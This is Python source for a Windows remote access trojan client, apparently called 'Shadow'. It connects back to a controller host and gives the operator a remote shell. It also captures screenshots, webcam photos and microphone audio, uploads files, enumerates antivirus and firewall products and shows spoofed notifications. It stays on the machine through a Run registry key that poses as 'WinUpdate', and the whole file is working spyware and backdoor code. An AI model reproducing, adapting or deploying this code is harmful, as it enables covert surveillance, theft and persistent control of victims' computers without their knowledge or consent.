import socket
import subprocess
import os
import sys
import struct
import simplejson
import shutil
import winreg
import platform
import wmi
import cv2
import requests
import sounddevice as sd
import wavio
import io
from PIL import ImageGrab
from plyer import notification
from cryptography.fernet import Fernet
from colorama import Fore, Style

KEY = 'RANDOM_KEY'

_k = KEY.encode() if isinstance(KEY, str) else KEY
fernet = Fernet(_k)

auth_code = 'authcode'

HOST = '__ipaddr__'
PORT = 12345

fileName = "app.exe"
use_app = False

time_value = 90

def encrypt(data): return fernet.encrypt(data)
def decrypt(data): return fernet.decrypt(data)

def json_receive(conn):
    json_data = ""
    try:
        json_data = json_data + recv_command(conn)
    except:pass
    return simplejson.loads(json_data)

def json_send(conn, data):
    json_data = simplejson.dumps(data)
    send_data(conn, json_data.encode("utf-8"))

def get_screenshot(conn):
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes = screenshot_bytes.getvalue()
    send_data(conn, screenshot_bytes)

def send_notification(conn, title, message, app_name):
    try:
        notification.notify(title=title, message=message, app_name=app_name)
    except:pass

def get_system_info(conn):
    try:
        info = {
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Processor": platform.processor(),
            "Python Build": platform.python_build(),
            "Python Version": platform.python_version()
        }
    except Exception as e:
        info = str(e)
    json_send(conn, info)

def get_security_info(conn):
    c = wmi.connect(namespace="root/SecurityCenter2")
    firewall = c.FirewallProduct()
    antivirus = c.AntiVirusProduct()
    firewall_info = [{"displayName": f.displayName, "instanceGuid": f.instanceGuid, 
                      "pathToSignedProductExe": f.pathToSignedProductExe , "pathToSignedReportingExe": f.pathToSignedReportingExe,
                      "productState": f.productState, "timestamp": f.timestamp} for f in firewall]
    antivirus_info = [{"displayName": a.displayName, "instanceGuid": a.instanceGuid, 
                      "pathToSignedProductExe": a.pathToSignedProductExe , "pathToSignedReportingExe": a.pathToSignedReportingExe,
                      "productState": a.productState, "timestamp": a.timestamp} for a in firewall]
    json_send(conn, {"Firewall": firewall_info, "Antivirus": antivirus_info})

def del_persistence(conn):
    try:
        key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_ALL_ACCESS
    )
        winreg.DeleteValue(key, "WinUpdate")
        winreg.CloseKey(key)
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        os.remove(target)
        send_data(conn , b'completed')
    except:pass

def add_persistence(conn):
    try:
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        if not os.path.exists(target):
            shutil.copyfile(sys.executable, target)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        send_data(conn, b'completed')
    except: pass

def send_data(conn, data: bytes):
    enc = encrypt(data)
    conn.sendall(struct.pack('>I', len(enc)))
    conn.sendall(enc)

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed while receiving data")
        data += chunk
    return data

def recv_command(conn, decode=True):
    try:
        size_data = recv_exact(conn, 4)
        size = struct.unpack('>I', size_data)[0]
        data = recv_exact(conn, size)
        dec = decrypt(data)
        return dec.decode() if decode else dec
    except Exception as e:
        print(e)
        raise


def handle_shell(conn):
    while True:
        try:
            data = recv_command(conn)
            if data == "exit":
                break
            elif data == "SHELLINFO":
                sendInput(conn)
            elif data.startswith("cd "):
                os.chdir(data[3:])
                send_data(conn, os.getcwd().encode())
            else:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate()
                output = stdout_value + stderr_value
                if not output:
                    output = "<No output>\n"
                send_data(conn, output)
        except Exception as error:
            send_data(conn, f"[-] Error: {error}".encode())
def handle_mic(conn):
    try:
        duration = 5
        fs = 44100
        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        wav_file = io.BytesIO()
        wavio.write(wav_file, rec, fs, sampwidth=2)
        if wav_file.getvalue():
            send_data(conn, wav_file.getvalue())
    except:
        send_data(conn, b'Error')

def handle_upload(conn):
    try: 
        file_name = recv_command(conn)
        send_data(conn, b'control')

        data = recv_command(conn, decode=False)
        with open(file_name, 'wb') as f:
            f.write(data)
    except Exception as error: pass

def handle_cam(conn):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, jpeg = cv2.imencode('.jpg', frame)
            send_data(conn, jpeg.tobytes())
        else:
            send_data(conn, b'[-] Failed')
    except: send_data(conn, b'[-] Error Take Photo')

def handle_geo(conn):
    try:
        r = requests.get('https://ipinfo.io/json')
        send_data(conn, r.text.encode())
    except: send_data(conn, b'[-] Failed To Get Location')

def run(filename):
    if getattr(sys, "frozen", False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    program_path = os.path.join(base_path, filename)
    if os.path.exists(program_path):
        try:
            os.system(f"start {program_path}")
        except:
            pass
def sendInput(conn):
    user = os.getlogin()
    cwd = os.getcwd()
    
    home = os.path.expanduser("~")
    display_path = cwd.replace(home, "~")

    prefix = f"{Fore.CYAN}{Style.BRIGHT}┌──({Fore.MAGENTA}Shadow{Fore.CYAN}@{Fore.WHITE}{user}{Fore.CYAN})"
    path_info = f"{Fore.CYAN}[{Fore.GREEN}{display_path}{Fore.CYAN}]"
    suffix = f"{Fore.CYAN}└─{Fore.RED}$ {Style.RESET_ALL}"

    value = f"{prefix}-{path_info}\n{suffix}"
    send_data(conn, value.encode())
def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            if recv_command(s) != auth_code: break
            send_data(s, b'UNSTAGED')
            while True:
                try:
                    cmd = recv_command(s)
                    print(cmd)
                    if cmd == "MODE_SHELL":
                        handle_shell(s)
                    elif cmd == "MODE_MIC":
                        handle_mic(s)
                    elif cmd == "MODE_UPLOAD":
                        handle_upload(s)
                    elif cmd == "MODE_CAM":
                        handle_cam(s)
                    elif cmd == "MODE_GEO":
                        handle_geo(s)
                    elif cmd == "MODE_BACKDOOR":
                        add_persistence(s)
                    elif cmd == "MODE_DEL":
                        del_persistence(s)
                    elif cmd == "MODE_NOTIFICATION":
                        notification_data = json_receive(s)
                        send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
                    elif cmd == "MODE_SCREENSHOT":
                        get_screenshot(s)
                    elif cmd == "MODE_SECINFO":
                        get_security_info(s)
                    elif cmd == "MODE_SYSINFO":
                        get_system_info(s)
                except ConnectionError: break
        except: pass
if(use_app):
    run(filename=fileName)
if __name__ == "__main__":
    main()